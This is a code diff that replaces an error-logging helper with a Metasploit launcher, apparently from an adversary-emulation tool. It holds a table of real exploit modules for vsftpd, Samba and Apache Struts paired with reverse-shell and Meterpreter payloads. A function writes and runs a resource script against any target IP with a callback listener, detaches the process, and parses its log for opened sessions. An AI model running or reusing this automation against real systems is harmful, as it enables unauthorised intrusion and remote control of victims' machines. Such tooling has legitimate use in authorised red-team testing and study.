@@ -1,64 +1,135 @@
 import os
-import json
+import time
+import subprocess
 from pathlib import Path
-from datetime import datetime
 
-PLUGIN_ERROR_LOG = os.path.expanduser("~/.evilEVE/logs/plugin_errors.jsonl")
+EXPLOIT_LIBRARY = {
+    "ftp_vsftpd": {
+        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+        "payload": "cmd/unix/interact",
+        "default_port": 21
+    },
+    "samba_usermap": {
+        "module": "exploit/linux/samba/usermap_script",
+        "payload": "cmd/unix/reverse",
+        "default_port": 139
+    },
+    "apache_struts": {
+        "module": "exploit/multi/http/struts2_content_type_ognl",
+        "payload": "java/meterpreter/reverse_tcp",
+        "default_port": 8080
+    }
+}
 
-
-def log_plugin_error(attacker: str, phase: str, tool: str, error_msg: str, context: dict = None):
+def run_msf_attack(
+    target_ip: str,
+    exploit_name: str = "ftp_vsftpd",
+    lhost: str = "10.0.0.100",
+    lport: str = "4444",
+    log_dir: str = "logs/metasploit"
+) -> dict:
     """
-    Appends a plugin error entry to the plugin error log.
+    Launches Metasploit against a target IP using a known exploit.
 
     Args:
-        attacker (str): Attacker name or profile.
-        phase (str): MITRE phase where the error occurred.
-        tool (str): The plugin/tool involved (e.g., metasploit, ghidra).
-        error_msg (str): Description of the error or exception.
-        context (dict): Optional additional details (e.g., input params).
-    """
-    Path(os.path.dirname(PLUGIN_ERROR_LOG)).mkdir(parents=True, exist_ok=True)
+        target_ip (str): The target IP to attack.
+        exploit_name (str): The key from EXPLOIT_LIBRARY to use.
+        lhost (str): The local host for reverse payloads.
+        lport (str): The port for callback listeners.
+        log_dir (str): Where to write the RC script and log.
 
-    entry = {
-        "timestamp": datetime.now().isoformat(),
-        "attacker": attacker,
-        "phase": phase,
-        "tool": tool,
-        "error": error_msg,
-        "context": context or {}
-    }
+    Returns:
+        dict: Dictionary with:
+            - script: path to .rc file
+            - log: path to msf log output
+            - exploit: exploit name used
+            - timestamp: run start time
+            - error (optional): if the attack failed to launch
+    """
+    Path(log_dir).mkdir(parents=True, exist_ok=True)
+    timestamp = int(time.time())
+    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
+    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")
+
+    if exploit_name not in EXPLOIT_LIBRARY:
+        return {
+            "error": f"Invalid exploit: {exploit_name}",
+            "exploit": exploit_name,
+            "script": None,
+            "log": None,
+            "timestamp": timestamp
+        }
+
+    module = EXPLOIT_LIBRARY[exploit_name]
 
     try:
-        with open(PLUGIN_ERROR_LOG, "a") as f:
-            f.write(json.dumps(entry) + "\n")
+        with open(script_path, "w") as f:
+            f.write(f"use {module['module']}\n")
+            f.write(f"set RHOST {target_ip}\n")
+            f.write(f"set LHOST {lhost}\n")
+            f.write(f"set LPORT {lport}\n")
+            f.write(f"set PAYLOAD {module['payload']}\n")
+            f.write("exploit -j\n")
     except Exception as e:
-        print(f"[plugin_errors] Failed to write plugin error: {e}")
+        return {
+            "error": f"Failed to write RC script: {e}",
+            "exploit": exploit_name,
+            "script": script_path,
+            "log": None,
+            "timestamp": timestamp
+        }
 
+    try:
+        subprocess.Popen(
+            ["nohup", "msfconsole", "-r", script_path],
+            stdout=open(log_path, "w"),
+            stderr=subprocess.STDOUT,
+            preexec_fn=os.setpgrp
+        )
+        print(f"[metasploit_plugin] Launched '{exploit_name}' against {target_ip} → {log_path}")
 
-def summarize_plugin_errors(log_path=PLUGIN_ERROR_LOG):
+        return {
+            "script": script_path,
+            "log": log_path,
+            "exploit": exploit_name,
+            "timestamp": timestamp
+        }
+
+    except Exception as e:
+        return {
+            "error": f"Failed to launch Metasploit: {e}",
+            "script": script_path,
+            "log": log_path,
+            "exploit": exploit_name,
+            "timestamp": timestamp
+        }
+
+def parse_msf_log(log_path: str) -> dict:
     """
-    Prints a summary of plugin errors from the log.
+    Parses a Metasploit log file to check for successful sessions or errors.
 
     Args:
-        log_path (str): Path to the plugin error log file.
+        log_path (str): Path to the log file created by Metasploit.
+
+    Returns:
+        dict: Summary including:
+            - session_opened (bool)
+            - errors (list of str)
+            - log_path (str)
     """
-    if not os.path.exists(log_path):
-        print("[plugin_errors] No plugin errors were logged.")
-        return
+    outcome = {"session_opened": False, "errors": [], "log_path": log_path}
 
     try:
         with open(log_path) as f:
-            entries = [json.loads(line) for line in f if line.strip()]
+            lines = f.readlines()
+
+        for line in lines:
+            if "Meterpreter session" in line or "Command shell session" in line:
+                outcome["session_opened"] = True
+            if "[error]" in line.lower() or "failed" in line.lower():
+                outcome["errors"].append(line.strip())
+
     except Exception as e:
-        print(f"[plugin_errors] Could not parse plugin error log: {e}")
-        return
+        outcome["errors"].append(f"Log parsing failed: {e}")
 
-    if not entries:
-        print("[plugin_errors] No plugin errors found.")
-        return
-
-    print("\n=== Plugin Error Summary ===")
-    for entry in entries:
-        print(f"[{entry['timestamp']}] Phase: {entry['phase']} | Tool: {entry['tool']} | Error: {entry['error']}")
-
-
+    return outcome
